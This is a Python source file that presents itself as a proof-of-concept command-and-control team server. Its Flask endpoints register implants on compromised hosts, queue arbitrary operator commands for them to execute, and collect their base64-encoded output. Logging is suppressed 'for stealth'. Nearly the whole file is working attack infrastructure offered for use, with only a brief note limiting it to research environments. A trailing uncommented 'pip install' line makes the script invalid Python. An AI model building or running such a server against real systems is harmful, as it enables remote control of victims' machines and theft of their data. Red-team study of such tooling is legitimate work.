#!/usr/bin/env python3
"""
Project: C2 Architecture PoC
Module: Team Server Controller
Author: mauvehack
License: MIT
Description: 
    Central command server handling agent registration, 
    task queuing (Beaconing), and result processing.
    
    WARNING: RESTRICTED TO ISOLATED RESEARCH ENVIRONMENTS ONLY.
"""

import logging
import uuid
import datetime
import base64
import os
from flask import Flask, request, jsonify, abort
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy.exc import IntegrityError

# --- Configuration ---
app = Flask(__name__)
# Using SQLite for PoC portability; upgrade to PostgreSQL for production
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///c2_operations.db' 
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

# Suppress default Flask logging for stealth simulation
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

db = SQLAlchemy(app)

# --- Database Models ---

class Agent(db.Model):
    """Represents a compromised host (Implant)."""
    id = db.Column(db.String(36), primary_key=True)  # UUID
    hostname = db.Column(db.String(128))
    platform = db.Column(db.String(64))
    username = db.Column(db.String(128))
    last_seen = db.Column(db.DateTime, default=datetime.datetime.utcnow)
    is_active = db.Column(db.Boolean, default=True)

class Task(db.Model):
    """Represents a command queued for an agent."""
    id = db.Column(db.Integer, primary_key=True)
    agent_id = db.Column(db.String(36), db.ForeignKey('agent.id'), nullable=False)
    command = db.Column(db.String(1024), nullable=False)
    status = db.Column(db.String(20), default='PENDING') # PENDING, SENT, COMPLETE
    output = db.Column(db.Text, nullable=True)
    created_at = db.Column(db.DateTime, default=datetime.datetime.utcnow)

# --- Helper Functions ---

def generate_task_id():
    return uuid.uuid4().hex[:8]

def log_event(message):
    timestamp = datetime.datetime.now().strftime("[%H:%M:%S]")
    print(f"{timestamp} [*] {message}")

# --- C2 Endpoints (The Listener) ---

@app.route('/api/v1/register', methods=['POST'])
def register_agent():
    """
    Initial Check-in: Registers a new implant.
    Expected JSON: {"hostname": "...", "platform": "...", "username": "..."}
    """
    data = request.json
    if not data:
        abort(400)

    # Generate a unique session ID for the implant
    agent_id = str(uuid.uuid4())
    
    new_agent = Agent(
        id=agent_id,
        hostname=data.get('hostname', 'UNKNOWN'),
        platform=data.get('platform', 'UNKNOWN'),
        username=data.get('username', 'UNKNOWN')
    )

    try:
        db.session.add(new_agent)
        db.session.commit()
        log_event(f"New Agent Registered: {agent_id} ({new_agent.hostname})")
        
        # Return the ID to the agent for future authentication
        return jsonify({"status": "success", "id": agent_id, "key": "RESERVED_FOR_AES_KEY"}), 201
    except IntegrityError:
        db.session.rollback()
        return jsonify({"status": "error", "message": "Registration failed"}), 500

@app.route('/api/v1/beacon/<agent_id>', methods=['GET'])
def beacon(agent_id):
    """
    Heartbeat: Agent asks 'Do you have work for me?'
    """
    agent = Agent.query.get(agent_id)
    if not agent:
        # If agent is unknown, force re-registration or ignore
        return jsonify({"action": "die"}), 404

    # Update last seen
    agent.last_seen = datetime.datetime.utcnow()
    db.session.commit()

    # Check for pending tasks (FIFO)
    pending_task = Task.query.filter_by(agent_id=agent_id, status='PENDING').first()

    if pending_task:
        log_event(f"Sending Task {pending_task.id} to Agent {agent_id}: {pending_task.command}")
        
        # Mark as sent so we don't send it twice
        pending_task.status = 'SENT'
        db.session.commit()

        # In a real scenario, this payload would be AES encrypted
        return jsonify({
            "task_id": pending_task.id,
            "action": "exec",
            "command": pending_task.command
        }), 200
    
    # No work? Sleep.
    return jsonify({"action": "sleep", "jitter": 0.1}), 200

@app.route('/api/v1/results/<agent_id>', methods=['POST'])
def submit_results(agent_id):
    """
    Output Ingestion: Agent sends back the results of a command.
    Expected JSON: {"task_id": 1, "output": "base64_encoded_string"}
    """
    data = request.json
    task_id = data.get('task_id')
    encoded_output = data.get('output')

    task = Task.query.get(task_id)
    if task and task.agent_id == agent_id:
        try:
            # Decode the output (simulating standard C2 traffic encoding)
            decoded_output = base64.b64decode(encoded_output).decode('utf-8', errors='ignore')
            
            task.output = decoded_output
            task.status = 'COMPLETE'
            db.session.commit()
            
            log_event(f"Received Result for Task {task_id} from {agent_id}")
            # print(f"Output:\n{decoded_output}") # Uncomment for verbose debugging
            return jsonify({"status": "ack"}), 200
        except Exception as e:
            log_event(f"Error processing results: {e}")
            return jsonify({"status": "error"}), 500
    
    return jsonify({"status": "ignored"}), 404

# --- Admin / Operator Interface (Simplified) ---

@app.route('/admin/queue', methods=['POST'])
def admin_queue_task():
    """
    Operator Entry Point: Queue a command for an agent.
    Expected JSON: {"agent_id": "...", "command": "whoami"}
    """
    data = request.json
    agent_id = data.get('agent_id')
    command = data.get('command')

    agent = Agent.query.get(agent_id)
    if not agent:
        return jsonify({"error": "Agent not found"}), 404

    new_task = Task(agent_id=agent_id, command=command)
    db.session.add(new_task)
    db.session.commit()

    log_event(f"Operator queued command for {agent_id}: {command}")
    return jsonify({"status": "queued", "task_id": new_task.id}), 201

# --- Entry Point ---

def init_db():
    """Initialize the database if it doesn't exist."""
    with app.app_context():
        db.create_all()
        log_event("Database initialized.")

if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser(description="C2 Team Server (PoC)")
    parser.add_argument("--port", type=int, default=8080, help="Listening port")
    parser.add_argument("--interface", type=str, default="0.0.0.0", help="Bind interface")
    args = parser.parse_args()

    print("""
    ################################################
    #       C2 ARCHITECTURE PoC | TEAM SERVER      #
    #       ---------------------------------      #
    #       Author: mauvehack                      #
    ################################################
    """)

    init_db()
    
    # Run Flask (Single-threaded for PoC clarity)
    app.run(host=args.interface, port=args.port)

# ---Required Dependencies ---

pip install flask flask-sqlalchemy

